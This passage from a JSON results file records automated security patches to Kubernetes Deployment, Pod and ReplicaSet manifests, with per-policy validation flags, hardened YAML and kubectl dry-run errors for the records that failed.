    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  labels:\n    app: work-queue\n    component: queue\n    chapter: jobs\n  name: queue\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: work-queue\n  template:\n    metadata:\n      labels:\n        app: work-queue\n        component: queue\n        chapter: jobs\n    spec:\n      containers:\n      - name: queue\n        image: gcr.io/kuar-demo/kuard-amd64:blue\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01508",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: ReplicaSet\nmetadata:\n  labels:\n    app: work-queue\n    component: queue\n    chapter: jobs\n  name: queue\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: work-queue\n  template:\n    metadata:\n      labels:\n        app: work-queue\n        component: queue\n        chapter: jobs\n    spec:\n      containers:\n      - name: queue\n        image: gcr.io/kuar-demo/kuard-amd64:blue\n        imagePullPolicy: Always\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01509",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-143\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      privileged: false\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01510",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-143\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      readOnlyRootFilesystem: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01511",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-143\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    securityContext:\n      runAsNonRoot: true\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      readOnlyRootFilesystem: true\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01512",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-143\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01513",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-143\nspec:\n  containers:\n  - name: nginx\n    image: nginx:stable\n    resources:\n      requests:\n        cpu: 100m\n        memory: 128Mi\n      limits:\n        cpu: 500m\n        memory: 256Mi\n    securityContext:\n      privileged: false\n      capabilities:\n        drop:\n        - NET_RAW\n        - NET_ADMIN\n        - SYS_ADMIN\n        - SYS_MODULE\n        - SYS_PTRACE\n        - SYS_CHROOT\n      allowPrivilegeEscalation: false\n      runAsNonRoot: true\n      readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01514",
    "policy_id": "no_latest_tag",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"study-builder\" is invalid: spec.template.spec.containers[0].resources.requests: Invalid value: \"500Mi\": must be less than or equal to memory limit of 256Mi"
    ]
  },
  {
    "id": "01515",
    "policy_id": "no_latest_tag",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"study-builder\" is invalid: spec.template.spec.containers[0].resources.requests: Invalid value: \"500Mi\": must be less than or equal to memory limit of 256Mi"
    ]
  },
  {
    "id": "01516",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"study-builder\" is invalid: spec.template.spec.containers[0].resources.requests: Invalid value: \"500Mi\": must be less than or equal to memory limit of 256Mi"
    ]
  },
  {
    "id": "01517",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"study-builder\" is invalid: spec.template.spec.containers[0].resources.requests: Invalid value: \"500Mi\": must be less than or equal to memory limit of 256Mi"
    ]
  },
  {
    "id": "01518",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"study-builder\" is invalid: spec.template.spec.containers[0].resources.requests: Invalid value: \"500Mi\": must be less than or equal to memory limit of 256Mi"
    ]
  },
  {
    "id": "01519",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"study-builder\" is invalid: spec.template.spec.containers[0].resources.requests: Invalid value: \"500Mi\": must be less than or equal to memory limit of 256Mi"
    ]
  },
  {
    "id": "01520",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"study-builder\" is invalid: spec.template.spec.containers[0].resources.requests: Invalid value: \"500Mi\": must be less than or equal to memory limit of 256Mi"
    ]
  },
  {
    "id": "01521",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"study-builder\" is invalid: spec.template.spec.containers[0].resources.requests: Invalid value: \"500Mi\": must be less than or equal to memory limit of 256Mi"
    ]
  },
  {
    "id": "01522",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"study-builder\" is invalid: spec.template.spec.containers[0].resources.requests: Invalid value: \"500Mi\": must be less than or equal to memory limit of 256Mi"
    ]
  },
  {
    "id": "01523",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pod-identity-webhook\n  namespace: pod-identity\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pod-identity-webhook\n  template:\n    metadata:\n      labels:\n        app: pod-identity-webhook\n    spec:\n      serviceAccountName: pod-identity-webhook\n      containers:\n      - name: pod-identity-webhook\n        image: IMAGE:stable\n        imagePullPolicy: Always\n        command:\n        - /webhook\n        - --in-cluster\n        - --namespace=pod-identity\n        - --service-name=pod-identity-webhook\n        - --tls-secret=pod-identity-webhook\n        - --annotation-prefix=eks.amazonaws.com\n        - --token-audience=sts.amazonaws.com\n        - --logtostderr\n        volumeMounts:\n        - name: webhook-certs\n          mountPath: /var/run/app/certs\n          readOnly: false\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: webhook-certs\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "01524",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pod-identity-webhook\n  namespace: pod-identity\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pod-identity-webhook\n  template:\n    metadata:\n      labels:\n        app: pod-identity-webhook\n    spec:\n      serviceAccountName: pod-identity-webhook\n      containers:\n      - name: pod-identity-webhook\n        image: IMAGE:stable\n        imagePullPolicy: Always\n        command:\n        - /webhook\n        - --in-cluster\n        - --namespace=pod-identity\n        - --service-name=pod-identity-webhook\n        - --tls-secret=pod-identity-webhook\n        - --annotation-prefix=eks.amazonaws.com\n        - --token-audience=sts.amazonaws.com\n        - --logtostderr\n        volumeMounts:\n        - name: webhook-certs\n          mountPath: /var/run/app/certs\n          readOnly: false\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: webhook-certs\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "01525",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pod-identity-webhook\n  namespace: pod-identity\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pod-identity-webhook\n  template:\n    metadata:\n      labels:\n        app: pod-identity-webhook\n    spec:\n      serviceAccountName: pod-identity-webhook\n      containers:\n      - name: pod-identity-webhook\n        image: IMAGE:stable\n        imagePullPolicy: Always\n        command:\n        - /webhook\n        - --in-cluster\n        - --namespace=pod-identity\n        - --service-name=pod-identity-webhook\n        - --tls-secret=pod-identity-webhook\n        - --annotation-prefix=eks.amazonaws.com\n        - --token-audience=sts.amazonaws.com\n        - --logtostderr\n        volumeMounts:\n        - name: webhook-certs\n          mountPath: /var/run/app/certs\n          readOnly: false\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: webhook-certs\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "01526",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pod-identity-webhook\n  namespace: pod-identity\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pod-identity-webhook\n  template:\n    metadata:\n      labels:\n        app: pod-identity-webhook\n    spec:\n      serviceAccountName: pod-identity-webhook\n      containers:\n      - name: pod-identity-webhook\n        image: IMAGE:stable\n        imagePullPolicy: Always\n        command:\n        - /webhook\n        - --in-cluster\n        - --namespace=pod-identity\n        - --service-name=pod-identity-webhook\n        - --tls-secret=pod-identity-webhook\n        - --annotation-prefix=eks.amazonaws.com\n        - --token-audience=sts.amazonaws.com\n        - --logtostderr\n        volumeMounts:\n        - name: webhook-certs\n          mountPath: /var/run/app/certs\n          readOnly: false\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: webhook-certs\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "01527",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: pod-identity-webhook\n  namespace: pod-identity\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: pod-identity-webhook\n  template:\n    metadata:\n      labels:\n        app: pod-identity-webhook\n    spec:\n      serviceAccountName: pod-identity-webhook\n      containers:\n      - name: pod-identity-webhook\n        image: IMAGE:stable\n        imagePullPolicy: Always\n        command:\n        - /webhook\n        - --in-cluster\n        - --namespace=pod-identity\n        - --service-name=pod-identity-webhook\n        - --tls-secret=pod-identity-webhook\n        - --annotation-prefix=eks.amazonaws.com\n        - --token-audience=sts.amazonaws.com\n        - --logtostderr\n        volumeMounts:\n        - name: webhook-certs\n          mountPath: /var/run/app/certs\n          readOnly: false\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: webhook-certs\n        emptyDir: {}\n",
    "errors": []
  },
  {
    "id": "01528",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"branchprotector\" namespace: \"default\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01529",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"branchprotector\" namespace: \"default\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01530",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"branchprotector\" namespace: \"default\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01531",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: error: resource mapping not found for name: \"branchprotector\" namespace: \"default\" from \"STDIN\": no matches for kind \"CronJob\" in version \"batch/v1beta1\"\nensure CRDs are installed first"
    ]
  },
  {
    "id": "01532",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"sample-app\" is invalid: spec.template.spec.containers[0].resources.requests: Invalid value: \"128Mi\": must be less than or equal to memory limit of 50Mi"
    ]
  },
  {
    "id": "01533",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"sample-app\" is invalid: spec.template.spec.containers[0].resources.requests: Invalid value: \"128Mi\": must be less than or equal to memory limit of 50Mi"
    ]
  },
  {
    "id": "01534",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Deployment \"sample-app\" is invalid: spec.template.spec.containers[0].resources.requests: Invalid value: \"128Mi\": must be less than or equal to memory limit of 50Mi"
    ]
  },
  {
    "id": "01535",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myjavaapp-deploy\n  labels:\n    app: myjavaapp\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: myjavaapp\n  template:\n    metadata:\n      labels:\n        app: myjavaapp\n    spec:\n      containers:\n      - name: myjavaapp-container\n        image: nagendra464/deployimage:1\n        ports:\n        - containerPort: 8080\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01536",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myjavaapp-deploy\n  labels:\n    app: myjavaapp\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: myjavaapp\n  template:\n    metadata:\n      labels:\n        app: myjavaapp\n    spec:\n      containers:\n      - name: myjavaapp-container\n        image: nagendra464/deployimage:1\n        ports:\n        - containerPort: 8080\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01537",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myjavaapp-deploy\n  labels:\n    app: myjavaapp\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: myjavaapp\n  template:\n    metadata:\n      labels:\n        app: myjavaapp\n    spec:\n      containers:\n      - name: myjavaapp-container\n        image: nagendra464/deployimage:1\n        ports:\n        - containerPort: 8080\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01538",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: myjavaapp-deploy\n  labels:\n    app: myjavaapp\nspec:\n  replicas: 2\n  selector:\n    matchLabels:\n      app: myjavaapp\n  template:\n    metadata:\n      labels:\n        app: myjavaapp\n    spec:\n      containers:\n      - name: myjavaapp-container\n        image: nagendra464/deployimage:1\n        ports:\n        - containerPort: 8080\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01539",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hvpa-controller\n  namespace: system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      controller: hvpa\n  template:\n    metadata:\n      labels:\n        controller: hvpa\n    spec:\n      containers:\n      - image: ggaurav10/hvpa-controller:stable\n        name: hvpa-manager\n        command:\n        - ./manager\n        - --logtostderr=true\n        - --v=2\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01540",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hvpa-controller\n  namespace: system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      controller: hvpa\n  template:\n    metadata:\n      labels:\n        controller: hvpa\n    spec:\n      containers:\n      - image: ggaurav10/hvpa-controller:stable\n        name: hvpa-manager\n        command:\n        - ./manager\n        - --logtostderr=true\n        - --v=2\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01541",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hvpa-controller\n  namespace: system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      controller: hvpa\n  template:\n    metadata:\n      labels:\n        controller: hvpa\n    spec:\n      containers:\n      - image: ggaurav10/hvpa-controller:stable\n        name: hvpa-manager\n        command:\n        - ./manager\n        - --logtostderr=true\n        - --v=2\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01542",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hvpa-controller\n  namespace: system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      controller: hvpa\n  template:\n    metadata:\n      labels:\n        controller: hvpa\n    spec:\n      containers:\n      - image: ggaurav10/hvpa-controller:stable\n        name: hvpa-manager\n        command:\n        - ./manager\n        - --logtostderr=true\n        - --v=2\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01543",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: hvpa-controller\n  namespace: system\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      controller: hvpa\n  template:\n    metadata:\n      labels:\n        controller: hvpa\n    spec:\n      containers:\n      - image: ggaurav10/hvpa-controller:stable\n        name: hvpa-manager\n        command:\n        - ./manager\n        - --logtostderr=true\n        - --v=2\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01544",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: app2\n  name: app2\n  namespace: app2-ns\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: app2\n  template:\n    metadata:\n      labels:\n        app: app2\n    spec:\n      containers:\n      - image: nginx:stable\n        name: app2\n        securityContext:\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01545",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
